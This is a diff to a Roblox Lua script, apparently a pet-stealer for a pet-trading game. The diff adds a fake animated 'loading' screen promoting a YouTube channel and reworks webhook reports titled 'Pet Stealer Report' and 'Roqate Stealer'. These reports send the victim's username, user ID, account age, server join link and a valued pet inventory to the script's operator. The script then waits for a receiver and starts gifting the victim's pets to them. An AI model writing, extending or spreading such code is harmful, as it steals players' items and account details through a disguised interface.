@@ -90,102 +90,353 @@ local function getPetsInventory()
                 fullName = item.Name,
                 kg = kg,
                 age = age,
-                special = isSpecial
+                special = isSpecial,
+                value = math.floor((kg * 10000) + (age * 1000))
             })
         end
     end
+    
+    -- Sort pets by value (highest first)
+    table.sort(pets, function(a, b)
+        return a.value > b.value
+    end)
+    
     return pets
 end
 
-local function calculatePetValue(kg, age)
-    return math.floor((kg * 10000) + (age * 1000))
+local function createLoader()
+    shared.LoaderTitle = "Subscribe to TwiistyScripts"
+    shared.LoaderKeyFrames = {
+        [1] = {1, 10},
+        [2] = {2, 30},
+        [3] = {3, 60},
+        [4] = {2, 100}
+    }
+    
+    local v2 = {
+        LoaderData = {
+            Name = shared.LoaderTitle or "A Loader",
+            Colors = shared.LoaderColors or {
+                Main = Color3.fromRGB(30, 30, 30),
+                Topic = Color3.fromRGB(200, 200, 200),
+                Title = Color3.fromRGB(255, 255, 255),
+                LoaderBackground = Color3.fromRGB(40, 40, 40),
+                LoaderSplash = Color3.fromRGB(130, 36, 212)
+            }
+        },
+        Keyframes = shared.LoaderKeyFrames or {
+            [1] = {1, 10},
+            [2] = {2, 30},
+            [3] = {3, 60},
+            [4] = {2, 100}
+        }
+    }
+    
+    local v3 = {
+        [1] = "Initializing...",
+        [2] = "Loading assets...",
+        [3] = "Connecting...",
+        [4] = "Complete!"
+    }
+
+    function TweenObject(v178, v179, v180)
+        game.TweenService:Create(v178, TweenInfo.new(v179, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), v180):Play()
+    end
+
+    function CreateObject(v181, v182)
+        local v183 = Instance.new(v181)
+        local v184
+        for v416, v417 in pairs(v182) do
+            if (v416 ~= "Parent") then
+                v183[v416] = v417
+            else
+                v184 = v417
+            end
+        end
+        v183.Parent = v184
+        return v183
+    end
+
+    local function v4(v186, v187)
+        local v188 = Instance.new("UICorner")
+        v188.CornerRadius = UDim.new(0, v186)
+        v188.Parent = v187
+    end
+
+    local v5 = CreateObject("ScreenGui", {
+        Name = "Core",
+        Parent = game.CoreGui
+    })
+
+    local v6 = CreateObject("Frame", {
+        Name = "Main",
+        Parent = v5,
+        BackgroundColor3 = v2.LoaderData.Colors.Main,
+        BorderSizePixel = 0,
+        ClipsDescendants = true,
+        Position = UDim2.new(0.5, 0, 0.5, 0),
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Size = UDim2.new(0, 0, 0, 0)
+    })
+
+    v4(12, v6)
+
+    local v7 = CreateObject("ImageLabel", {
+        Name = "UserImage",
+        Parent = v6,
+        BackgroundTransparency = 1,
+        Image = "rbxassetid://81767899440204",
+        Position = UDim2.new(0, 15, 0, 10),
+        Size = UDim2.new(0, 50, 0, 50)
+    })
+
+    v4(25, v7)
+
+    local v8 = CreateObject("TextLabel", {
+        Name = "UserName",
+        Parent = v6,
+        BackgroundTransparency = 1,
+        Text = "Youtube: TwiistyScripts",
+        Position = UDim2.new(0, 75, 0, 10),
+        Size = UDim2.new(0, 200, 0, 50),
+        Font = Enum.Font.GothamBold,
+        TextColor3 = v2.LoaderData.Colors.Title,
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left
+    })
+
+    local v9 = CreateObject("TextLabel", {
+        Name = "Top",
+        TextTransparency = 1,
+        Parent = v6,
+        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 30, 0, 70),
+        Size = UDim2.new(0, 301, 0, 20),
+        Font = Enum.Font.Gotham,
+        Text = "Loader",
+        TextColor3 = v2.LoaderData.Colors.Topic,
+        TextSize = 10,
+        TextXAlignment = Enum.TextXAlignment.Left
+    })
+
+    local v10 = CreateObject("TextLabel", {
+        Name = "Title",
+        Parent = v6,
+        TextTransparency = 1,
+        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 30, 0, 90),
+        Size = UDim2.new(0, 301, 0, 46),
+        Font = Enum.Font.Gotham,
+        RichText = true,
+        Text = "<b>" .. v2.LoaderData.Name .. "</b>",
+        TextColor3 = v2.LoaderData.Colors.Title,
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left
+    })
+
+    local v11 = CreateObject("Frame", {
+        Name = "BG",
+        Parent = v6,
+        AnchorPoint = Vector2.new(0.5, 0),
+        BackgroundTransparency = 1,
+        BackgroundColor3 = v2.LoaderData.Colors.LoaderBackground,
+        BorderSizePixel = 0,
+        Position = UDim2.new(0.5, 0, 0, 70),
+        Size = UDim2.new(0.8500000238418579, 0, 0, 24)
+    })
+
+    v4(8, v11)
+
+    local v12 = CreateObject("Frame", {
+        Name = "Progress",
+        Parent = v11,
+        BackgroundColor3 = v2.LoaderData.Colors.LoaderSplash,
+        BackgroundTransparency = 1,
+        BorderSizePixel = 0,
+        Size = UDim2.new(0, 0, 0, 24)
+    })
+
+    v4(8, v12)
+
+    local v13 = CreateObject("TextLabel", {
+        Name = "StepLabel",
+        Parent = v6,
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0.5, 0, 1, -25),
+        Size = UDim2.new(1, -20, 0, 20),
+        Font = Enum.Font.Gotham,
+        Text = "",
+        TextColor3 = v2.LoaderData.Colors.Topic,
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        AnchorPoint = Vector2.new(0.5, 0.5)
+    })
+
+    function UpdateStepText(v191)
+        v13.Text = v3[v191] or ""
+    end
+
+    function UpdatePercentage(v193, v194)
+        TweenObject(v12, 0.5, {
+            Size = UDim2.new(v193/100, 0, 0, 24)
+        })
+        UpdateStepText(v194)
+    end
+
+    TweenObject(v6, 0.25, {
+        Size = UDim2.new(0, 346, 0, 121)
+    })
+    
+    wait()
+    
+    TweenObject(v9, 0.5, {
+        TextTransparency = 0
+    })
+    
+    TweenObject(v10, 0.5, {
+        TextTransparency = 0
+    })
+    
+    TweenObject(v11, 0.5, {
+        BackgroundTransparency = 0
+    })
+    
+    TweenObject(v12, 0.5, {
+        BackgroundTransparency = 0
+    })
+
+    for v195, v196 in pairs(v2.Keyframes) do
+        wait(v196[1])
+        UpdatePercentage(v196[2], v195)
+    end
+
+    UpdatePercentage(100, 4)
+    
+    TweenObject(v9, 0.5, {
+        TextTransparency = 1
+    })
+    
+    TweenObject(v10, 0.5, {
+        TextTransparency = 1
+    })
+    
+    TweenObject(v11, 0.5, {
+        BackgroundTransparency = 1
+    })
+    
+    TweenObject(v12, 0.5, {
+        BackgroundTransparency = 1
+    })
+    
+    wait(0.5)
+    
+    TweenObject(v6, 0.25, {
+        Size = UDim2.new(0, 0, 0, 0)
+    })
+    
+    wait(0.25)
+    v5:Destroy()
 end
 
 local function splitEmbeds(pets, totalValue, specialCount)
     local embeds = {}
-    local currentEmbed = {
-        title = "📊 Player Inventory Report",
-        color = 65280,
-        timestamp = DateTime.now():ToIsoDate(),
-        fields = {}
-    }
-    
-    -- Add basic info to first embed
     local placeId = game.PlaceId
     local jobId = game.JobId
     local gameInstanceId = tostring(game.JobId)
     
-    table.insert(currentEmbed.fields, {
-        name = "👤 Player Info",
-        value = string.format("```Username: %s (@%s)\nAccount Age: %d days\nExecutor: %s```", 
-            LocalPlayer.Name, 
-            LocalPlayer.DisplayName, 
-            LocalPlayer.AccountAge,
-            identifyExecutor()
-        ),
-        inline = false
-    })
+    -- Main embed with player info and summary
+    local mainEmbed = {
+        title = "🐾 Pet Stealer Report",
+        color = 0x8324D4, -- Purple color
+        timestamp = DateTime.now():ToIsoDate(),
+        thumbnail = {
+            url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
+        },
+        fields = {
+            {
+                name = "👤 Player Information",
+                value = string.format("```Username: %s (@%s)\nUser ID: %d\nAccount Age: %d days\nExecutor: %s```", 
+                    LocalPlayer.Name, 
+                    LocalPlayer.DisplayName,
+                    LocalPlayer.UserId,
+                    LocalPlayer.AccountAge,
+                    identifyExecutor()
+                ),
+                inline = false
+            },
+            {
+                name = "🌐 Server Information",
+                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", 
+                    game:GetService("MarketplaceService"):GetProductInfo(placeId).Name,
+                    placeId, 
+                    jobId,
+                    placeId,
+                    jobId
+                ),
+                inline = false
+            },
+            {
+                name = "📊 Inventory Summary",
+                value = string.format("```Total Pets: %d\n🌟 Special Pets: %d\n💰 Total Value: %s¢```", 
+                    #pets, 
+                    specialCount,
+                    tostring(totalValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
+                ),
+                inline = false
+            }
+        },
+        footer = {
+            text = "Roqate Stealer • "..os.date("%m/%d/%Y %I:%M %p"),
+            icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
+        }
+    }
     
-    table.insert(currentEmbed.fields, {
-        name = "🌐 Server Info",
-        value = string.format("```Place ID: %d\nGame Instance: %s```\n[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", 
-            placeId, 
-            gameInstanceId,
-            placeId,
-            gameInstanceId
-        ),
-        inline = false
-    })
+    table.insert(embeds, mainEmbed)
     
-    table.insert(currentEmbed.fields, {
-        name = "📦 Inventory Summary",
-        value = string.format("```Total Pets: %d\nSpecial Pets: %d\nTotal Value: %d¢```", 
-            #pets, 
-            specialCount,
-            totalValue
-        ),
-        inline = false
-    })
-    
-    table.insert(embeds, currentEmbed)
-    
-    -- Split pets into multiple embeds if needed
+    -- Split pets into chunks of 10 for better organization
     local petChunks = {}
-    for i = 1, #pets, 20 do
-        table.insert(petChunks, {table.unpack(pets, i, math.min(i + 19, #pets))})
+    for i = 1, #pets, 10 do
+        table.insert(petChunks, {table.unpack(pets, i, math.min(i + 9, #pets))})
     end
     
     for i, chunk in ipairs(petChunks) do
-        if i > 1 then
-            currentEmbed = {
-                title = string.format("📊 Player Inventory Report (Part %d)", i),
-                color = 65280,
-                timestamp = DateTime.now():ToIsoDate(),
-                fields = {}
-            }
-        end
-        
         local petList = ""
+        local totalChunkValue = 0
+        
         for _, pet in ipairs(chunk) do
-            local value = calculatePetValue(pet.kg, pet.age)
-            petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %d¢\n",
+            petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %s¢\n",
                 pet.special and "🌟" or "🐶",
                 pet.name,
                 pet.kg,
                 pet.age,
-                value
+                tostring(pet.value):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
             )
+            totalChunkValue = totalChunkValue + pet.value
         end
         
-        table.insert(currentEmbed.fields, {
-            name = string.format("🐾 Pets (%d-%d)", (i-1)*20 + 1, math.min(i*20, #pets)),
-            value = "```"..petList.."```",
-            inline = false
-        })
+        local petEmbed = {
+            title = string.format("📦 Pet Inventory (Part %d/%d)", i, #petChunks),
+            color = 0x8324D4,
+            fields = {
+                {
+                    name = string.format("🐾 Pets %d-%d (Total: %s¢)", 
+                        (i-1)*10 + 1, 
+                        math.min(i*10, #pets),
+                        tostring(totalChunkValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
+                    ),
+                    value = "```"..petList.."```",
+                    inline = false
+                }
+            },
+            footer = {
+                text = "Roqate Stealer • Part "..i.." of "..#petChunks,
+                icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
+            }
+        }
         
-        if i > 1 then
-            table.insert(embeds, currentEmbed)
-        end
+        table.insert(embeds, petEmbed)
     end
     
     return embeds
@@ -197,8 +448,7 @@ local function sendInitialReport()
     local specialCount = 0
     
     for _, pet in ipairs(pets) do
-        local value = calculatePetValue(pet.kg, pet.age)
-        totalValue = totalValue + value
+        totalValue = totalValue + pet.value
         if pet.special then specialCount = specialCount + 1 end
     end
 
@@ -206,39 +456,6 @@ local function sendInitialReport()
     sendWebhook({
         embeds = embeds
     })
-end
-
-local function createLoader()
-    local loaderGui = Instance.new("ScreenGui")
-    loaderGui.Name = "TwistyLoader"
-    loaderGui.IgnoreGuiInset = true
-    loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    loaderGui.DisplayOrder = 999999
-
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 400, 0, 150)
-    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = loaderGui
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = mainFrame
-
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Text = "Subscribed to Twisty"
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleLabel.TextSize = 24
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Size = UDim2.new(1, 0, 0, 50)
-    titleLabel.Position = UDim2.new(0, 0, 0, 10)
-    titleLabel.Parent = mainFrame
-
-    loaderGui.Parent = CoreGui
-    return loaderGui
 end
 
 local function isPetFavorited(petName)
@@ -354,10 +571,9 @@ local function startGifting(targetPlayer)
     end
 end
 
-local loader = createLoader()
+createLoader()
 sendInitialReport()
 task.wait(2)
-loader:Destroy()
 
 local receiver = waitForReceiver()
 if not receiver then return end
